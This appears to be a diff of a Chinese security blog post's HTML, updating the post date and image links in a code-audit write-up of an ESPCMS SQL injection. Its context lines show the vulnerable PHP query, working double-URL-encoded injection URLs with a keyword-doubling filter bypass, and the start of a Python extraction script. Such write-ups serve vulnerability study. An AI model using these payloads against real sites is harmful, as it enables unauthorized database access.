@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-06-27
+                    2024-07-27
                 </div>
                 
 
@@ -477,7 +477,7 @@
 <p>代码审计的时候可以通过搜索这两个函数<code>urldecode</code>或者<code>rawurldecode</code>来寻找漏洞</p>
 <h2 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h2><p>先搭建环境，进入首页，配置好数据库及其他配置</p>
 <p>漏洞在<code>interface/search.php</code>文件和<code>interface/3gwap_search.php</code>文件<code>in_taglist()</code>函数</p>
-<p><img src="https://z3.ax1x.com/2021/11/25/oAD734.png" alt="oAD734.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/59195d643c2222e1700406d1010483c0.png"></p>
 <p>可以看到一个搜索框和两个参数，审计代码</p>
 <p>代码中有三个函数，<code>in_list(),in_result(),in_taglist()</code>，第二函数应该是调用函数，阅读代码得到第三个参数是tagkey</p>
 <p>函数代码</p>
@@ -552,11 +552,11 @@
 <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>创建并且执行sql语句，可以看到中间并没有其他的手段</p>
-<p><img src="https://z3.ax1x.com/2021/11/25/oADOD1.png" alt="oADOD1.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/e9cb89dac59d7cb4a2030af0d3f947be.png"></p>
 <p>在如图添加一条回显，方便调试</p>
-<p><img src="https://z3.ax1x.com/2021/11/25/oADXHx.png" alt="oADXHx.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/22db695e34dfe109a22d0f070b6d83a9.png"></p>
 <p>可以看到单引号被转义了，这时利用<code>urldecode()</code>的特性，报错存在注入</p>
-<p><img src="https://z3.ax1x.com/2021/11/25/oArpCD.png" alt="oArpCD.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/dcbb61fbf9e911eed98d38a406c7a466.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$db_where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">' WHERE lng=\''</span> <span class="token operator">.</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' AND isclass=1'</span><span class="token punctuation">;</span>
 <span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -564,7 +564,7 @@
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=1 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>返回结果为真</p>
-<p><img src="https://z3.ax1x.com/2021/11/25/oArFKA.png" alt="oArFKA.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/c8bc7735d13bbba8b53d3fdb90b0e277.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=2 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>返回结果为假<img src="https://z3.ax1x.com/2021/11/25/oArAbt.png" alt="oArAbt.png"></p>
@@ -572,7 +572,7 @@
 <p>测试注入数据库长度</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or (seleselectct length(database())=9)  %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://z3.ax1x.com/2021/11/25/oAre58.png" alt="oAre58.png"></p>
+<p><img src="https://images.dadream.eu.org/images/2024/07/31d5b56cb336e7a83ab881317b023504.png"></p>
 <p>相符合，其他的用脚本就能跑出来</p>
 <h2 id="脚本演示"><a href="#脚本演示" class="headerlink" title="脚本演示"></a>脚本演示</h2><h3 id="爆数据库长度"><a href="#爆数据库长度" class="headerlink" title="爆数据库长度"></a>爆数据库长度</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 
